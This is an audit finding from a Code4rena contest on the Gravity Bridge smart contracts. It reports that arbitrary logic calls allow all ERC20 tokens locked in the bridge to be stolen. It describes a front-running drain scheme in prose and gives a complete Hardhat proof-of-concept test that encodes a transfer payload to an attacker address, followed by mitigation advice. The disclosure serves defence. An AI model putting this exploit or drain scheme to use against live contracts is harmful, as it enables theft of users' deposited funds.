# [H] Arbitrary Logic Enables ERC20 Theft

## Summary
Severity: High
Chain: Smart contract
Component: 2021-08-gravitybridge
Published: 2021-08-26
Source: https://github.com/code-423n4/2021-08-gravitybridge-findings/issues/1
Type: code-finding

## Details
# Handle

ElliotFriedman


# Vulnerability details

## Severe Issue: ERC20 Token Theft Using Arbitrary Logic

There are 2 ways that this bug can be used to drain funds from the bridge. Both are catastrophic and result in total loss of funds. The 1st method is horrible, the second method is diabolical as it can extract the most possible value out of the contracts.


Method 1.

Anyone who can use arbitrary logic commands on the cosmos side can use arbitrary logic to instruct the bridge to make an arbitrary logic call to a token that the gravity bridge owns with calldata of transfer. This would allow the attacker to steal all of the ERC20 tokens locked in the gravity bridge.


Method 2.

Alternatively, an attacker could use the arbitrary logic to approve the gravity bridge’s tokens for spending by another smart contract set up specifically to drain the gravity bridge on command. Then, the attacker could set up a cosmos event listener to the gravity chain and when the attacker witnessed someone else trying to perform the same attack of stealing ERC20 tokens by either trying to use arbitrary logic to do an approval, a transfer, or a transferFrom, they would then call the smart contract on ethereum that the gravity bridge had already approved to spend all of its token and completely drain the gravity bridge of all ERC20 assets.

Issue approval calls to your malicious smart contract on ethereum using arbitrary logic. Do this across all tokens the gravity bridge holds and issue your contract infinite approval
Setup a relayer to watch for events on gravity chain listening for other users trying to perform malicious actions such as calling approve, transfer transferFrom
When the relayer detects malicious behavior from a user on cosmos, the relayer will automatically call your smart contract on ethereum which will completely drain the gravity bridge smart contract of all funds ahead of the other attacker

Impact of this finding is that once arbitrary logic is enabled on cosmos, ALL ERC20 ASSETS CAN BE STOLEN from the gravity bridge by a few simple arbitrary logic calls.

## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

The following proof of concept is for method 1. Add the following code to a file in the solidity/test folder, then run npx hardhat test solidity/test/fileName 



import chai from "chai";
import { ethers } from "hardhat";
import { solidity } from "ethereum-waffle";
 
import { deployContracts } from "../test-utils";
import {
 getSignerAddresses,
 signHash,
 examplePowers,
} from "../test-utils/pure";
 
chai.use(solidity);
const { expect } = chai;
 
// This test produces a hash for the contract which should match what is being used in the Go unit tests. It's here for
// the use of anyone updating the Go tests.
describe("Arbitrary Logic Theft Suite", function () {
 it("Arbitrary logic enables attacker to call transfer function and abscond with funds", async function () {
   // Prep and deploy contract
   // ========================
   const signers = await ethers.getSigners();
 
   const hacker = signers[2].address;
 
   const gravityId = ethers.utils.formatBytes32String("foo");
   const powers = [6667];
   const validators = signers.slice(0, powers.length);
   const powerThreshold = 6666;
   const {
     gravity,
     testERC20,
     checkpoint: deployCheckpoint,
   } = await deployContracts(gravityId, validators, powers, powerThreshold);
 
   // Transfer out to Cosmos, locking coins
   // =====================================
   await testERC20.functions.approve(gravity.address, 1000);
   await gravity.functions.sendToCosmos(
     testERC20.address,
     ethers.utils.formatBytes32String("myCosmosAddress"),
     1000
   );
 
   console.log(
     "Current balance of bridge test tokens: ",
     (await testERC20.balanceOf(gravity.address)).toString()
   );
 
   // Call method
   // ===========
   const methodName = ethers.utils.formatBytes32String("logicCall");
   const numTxs = 10;
 
   let invalidationNonce = 1;
 
   let timeOut = 4766922941000;
   const theftAmount = 999;
 
   let logicCallArgs = {
     transferAmounts: [], // transferAmounts
     transferTokenContracts: [], // transferTokenContracts
     feeAmounts: [1], // feeAmounts
     feeTokenContracts: [testERC20.address], // feeTokenContracts
     logicContractAddress: testERC20.address, // logicContractAddress
     payload: testERC20.interface.encodeFunctionData("transfer", [
       hacker,
       theftAmount,
     ]), // payloads
     timeOut,
     invalidationId: ethers.utils.formatBytes32String("invalidationId"), // invalidationId
     invalidationNonce: invalidationNonce, // invalidationNonce
   };
 
   const abiEncodedLogicCall = ethers.utils.defaultAbiCoder.encode(
     [
       "bytes32", // gravityId
       "bytes32", // methodName
       "uint256[]", // transferAmounts
       "address[]", // transferTokenContracts
       "uint256[]", // feeAmounts
       "address[]", // feeTokenContracts
       "address", // logicContractAddress
       "bytes", // payload
       "uint256", // timeOut
       "bytes32", // invalidationId
       "uint256", // invalidationNonce
     ],
     [
       gravityId,
       methodName,
       logicCallArgs.transferAmounts,
       logicCallArgs.transferTokenContracts,
       logicCallArgs.feeAmounts,
       logicCallArgs.feeTokenContracts,
       logicCallArgs.logicContractAddress,
       logicCallArgs.payload,
       logicCallArgs.timeOut,
       logicCallArgs.invalidationId,
       logicCallArgs.invalidationNonce,
     ]
   );
   const logicCallDigest = ethers.utils.keccak256(abiEncodedLogicCall);
 
   const sigs = await signHash(validators, logicCallDigest);
   const currentValsetNonce = 0;
 
   // TODO construct the easiest possible delegate contract that will
   // actually execute, existing ones are too large to bother with for basic
   // signature testing
 
   console.log(
     "Current balance of hacker address tokens before theft: ",
     (await testERC20.balanceOf(hacker)).toString()
   );
 
   var res = await gravity.submitLogicCall(
     await getSignerAddresses(validators),
     powers,
     currentValsetNonce,
 
     sigs.v,
     sigs.r,
     sigs.s,
 
     logicCallArgs
   );
   console.log(
     "Current balance of hacker address after theft: ",
     (await testERC20.balanceOf(hacker)).toString()
   );
 
   // assert hacker stole all the funds
   expect((await testERC20.balanceOf(hacker)).toString()).to.be.equal(
     (10000 + theftAmount).toString()
   );
 });
});
 





## Tools Used
Hardhat

## Recommended Mitigation Steps

Maintain a whitelist in the gravity bridge contract of addresses of tokens that have been locked in your smart contract and do not allow whitelisted addresses to be the subject of arbitrary logic calls at the smart contract level. This would prevent theft of tokens that users locked in your smart contract using the proper lock API on the smart contract as attackers would not be able to issue commands against the assets you own.

Alternatively, you could just add a list of function signatures that are not allowed to be called by arbitrary logic such as transfer, transferTo, transferFrom, approve and other functions on ERC20 tokens that allow assets to be transferred. The only downside of this is that if projects extend their ERC20 tokens, or change interfaces it would still allow ERC20 token theft from your bridge.

There could be other unknown side affects and hacks possible because of the enabling of arbitrary logic that were not discovered in this bug. I recommend getting a solidity expert on staff or solidity auditor who can think through all of the other possible ways this arbitrary logic could mess your system up and behave in unintended ways.
